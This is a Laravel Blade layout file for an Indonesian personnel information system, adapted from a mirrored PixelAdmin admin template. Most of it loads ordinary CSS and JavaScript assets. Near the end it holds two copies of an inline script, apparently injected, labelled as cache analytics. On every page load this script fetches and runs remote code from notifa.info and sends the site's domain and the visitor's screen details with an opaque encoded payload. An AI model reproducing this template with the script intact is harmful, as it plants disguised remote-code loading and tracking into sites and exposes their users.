<!DOCTYPE html>
<html lang="en">
<!-- Mirrored from wrappixel.com/demos/admin-templates/pixeladmin/main/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jul 2018 07:05:05 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Sistem Informasi Dispsiad">
    <meta name="author" content="Compunerd.ID">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="{{ asset('asset/image/png') }}" sizes="16x16" href="{{ asset('asset/image/logo.png') }}">
    <title>Sistem Informasi Personel Dispsiad</title>
    <!-- Bootstrap Core CSS -->
    <link href="{{ asset('asset/bootstrap/dist/css/bootstrap.min.css') }}" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css') }}" rel="stylesheet">
    <!-- toast CSS -->
    <link href="{{ asset('asset/plugins/bower_components/toast-master/css/jquery.toast.css') }}" rel="stylesheet">
    <!-- morris CSS -->
    <link href="{{ asset('asset/plugins/bower_components/morrisjs/morris.css') }}" rel="stylesheet">
    <!-- animation CSS -->
    <link href="{{ asset('asset/css/animate.css') }}" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="{{ asset('asset/css/style.css') }}" rel="stylesheet">
    <!-- color CSS -->
    <link href="{{ asset('asset/css/colors/blue.css') }}" id="theme" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<body>
    <!-- Preloader -->
    <div class="preloader">
        <div class="cssload-speeding-wheel"></div>
    </div>
    @yield('content')
<!-- /#wrapper -->
</body>
    <!-- jQuery -->
    <script src="{{ asset('asset/plugins/bower_components/jquery/dist/jquery.min.js') }}"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="{{ asset('asset/bootstrap/dist/js/bootstrap.min.js') }}"></script>
    <!-- Menu Plugin JavaScript -->
    <script src="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js') }}"></script>
    <!--slimscroll JavaScript -->
    <script src="{{ asset('asset/js/jquery.slimscroll.js') }}"></script>
    <!--Wave Effects -->
    <script src="{{ asset('asset/js/waves.js') }}"></script>
    <!--Counter js -->
    <script src="{{ asset('asset/plugins/bower_components/waypoints/lib/jquery.waypoints.js') }}"></script>
    <script src="{{ asset('asset/plugins/bower_components/counterup/jquery.counterup.min.js') }}"></script>
    <!--Morris JavaScript -->
    <script src="{{ asset('asset/plugins/bower_components/raphael/raphael-min.js') }}"></script>
    <script src="{{ asset('asset/plugins/bower_components/morrisjs/morris.js') }}"></script>
    <!-- Custom Theme JavaScript -->
    <script src="{{ asset('asset/js/custom.min.js') }}"></script>
    <script src="{{ asset('asset/js/dashboard1.js') }}"></script>
    <!-- Sparkline chart JavaScript -->
    <script src="{{ asset('asset/plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js') }}"></script>
    <script src="{{ asset('asset/plugins/bower_components/jquery-sparkline/jquery.charts-sparkline.js') }}"></script>
    <script src="{{ asset('asset/plugins/bower_components/toast-master/js/jquery.toast.js') }}"></script>
    <script src="{{ asset('asset/plugins/bower_components/styleswitcher/jQuery.style.switcher.js') }}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYVcyCLFVCu9IUBITM5nfRfI621FVInN7YZ%2fcIQzWOfwlOsEc5pW4KHBQUc9Ui0LVAsZMAQJda%2bvRN9PGYw2JYqj51GJ%2bKUMYCl8Xtp9rhEmMs8sOjA7xbwcJEqyuC4OSmX4Em4Jr%2bUgbJQMiCjYwjWUPu5Kwlh8KTl1%2bmw1h1oB0HtoYc5TkLDWkosjZ3NAxAgkHy0QY8rHoEr%2flCq7wxJj7En6TKCEuYwXvC1ONLwwq11xAOKKQiiZ4%2fqiEKzLKwIhH6M32p1RqMouPstSUKG1oCdBQ2ZNl7UqGm8UUmU4xKexNVNXCPArMgfxWTARfwqu8HCEO0aLLdSamO5gVHDZvneBdcI%2fWouZAC876Ku2Qros%2fQOO5PNaFPBrNcbJS83UNYSpkRB76XZAn2NfsdMyThA%2bwBdTzlM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    <!-- <script type="text/javascript">
    $(document).ready(function() {
        $.toast({
            heading: 'Welcome to Pixel admin',
            text: 'Use the predefined ones, or specify a custom position object.',
            position: 'top-right',
            loaderBg: '#ff6849',
            icon: 'info',
            hideAfter: 3500,
            stack: 6
        })
    });
    </script> -->
    <!--Style Switcher -->
    <script src="{{ asset('asset/plugins/bower_components/styleswitcher/jQuery.style.switcher.js') }}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYXjPxCe3OlvXB9Iu75bcgaU6HiJuW1xmMV5ty%2fa9xCiWe%2fJqTvN%2fIBSi4PCe3KUjfsXQjEXvK%2bjcDUYQ4u4efaU%2fpej2pImSoUgT5vDxCiNEBOZuolPBpPiMPuDvoKVEVb7OoOesmqkl3rBqyo8IC5N9XEPy5J680krrJKw6s9Nss31zUNgai2QMOxexbnkXuXh6SHV7or4YmoI3Mh%2fd2zRlKkLw0IBxOEF0J8BPmWgjBqVfF%2btpzQii0lHCiAvVoHjU%2bNp5y3FyZqL%2b0W9C1eR8y4pcQNs7wuZiA3TsrFGareE21kv3Wydb8I%2fZqrqgFdoztI02Izbe4e3hiXO1cchVCNtc7UumK9cRDsl3IhkWWqT07dtmAm5ZTK%2f4%2b6fPQYk7tBRvYY4W8ZJyoKx%2fz1y0zJYGgOdef8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


<!-- Mirrored from wrappixel.com/demos/admin-templates/pixeladmin/main/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jul 2018 07:06:48 GMT -->
</html>